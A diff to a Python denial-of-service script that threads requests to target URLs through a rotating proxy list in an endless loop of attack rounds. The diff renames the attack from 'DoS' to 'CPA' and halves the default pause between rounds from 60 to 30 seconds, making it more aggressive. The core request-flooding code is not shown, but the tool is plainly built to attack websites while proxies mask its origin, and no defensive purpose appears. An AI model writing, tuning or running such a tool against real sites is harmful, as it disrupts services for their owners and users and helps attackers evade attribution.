@@ -157,13 +157,13 @@ def load_proxies(proxy_file_path, check_proxies=False):
 
 def dos(target_urls, attack_option, proxy_list):
     """
-    Initiates the DoS attack by creating threads for each target URL and proxy.
+    Initiates the CPA attack by creating threads for each target URL and proxy.
     """
     threads = []
     proxy_index = 0
     num_proxies = len(proxy_list)
     
-    print(f"\n--- Starting DoS attack round ---")
+    print(f"\n--- Starting CPA attack ---")
     print(f"Targeting: {', '.join(target_urls)}")
     print(f"Using {num_proxies} proxies (Direct if 0).")
 
@@ -252,8 +252,8 @@ def main():
     parser.add_argument(
         "-i", "--interval",
         type=int,
-        default=60,
-        help="Interval in seconds between attack rounds.\nDefault: 60"
+        default=30,
+        help="Interval in seconds between attack rounds.\nDefault: 30"
     )
     parser.add_argument(
         "--check-proxies",
@@ -303,7 +303,7 @@ def main():
     print(f"SSL Verification: {'Enabled' if VERIFY_SSL else 'Disabled'}")
     print(f"Proxy Timeout: {PROXY_TIMEOUT}s")
     print(f"Request Timeout: {REQUEST_TIMEOUT}s")
-    print("------------------------------")
+    print("-----------------------")
     
     proxy_list = load_proxies(PROXY_FILE, args.check_proxies)
     
@@ -318,7 +318,7 @@ def main():
     try:
         while True:
             dos(TARGET_URLS, ATTACK_OPTION, proxy_list)
-            print(f"\n--- Attack round finished ---")
+            print(f"\n--- CPA attack round finished ---")
             print(f"Waiting for {ATTACK_INTERVAL} seconds before next attack round...")
             time.sleep(ATTACK_INTERVAL)
     except KeyboardInterrupt:
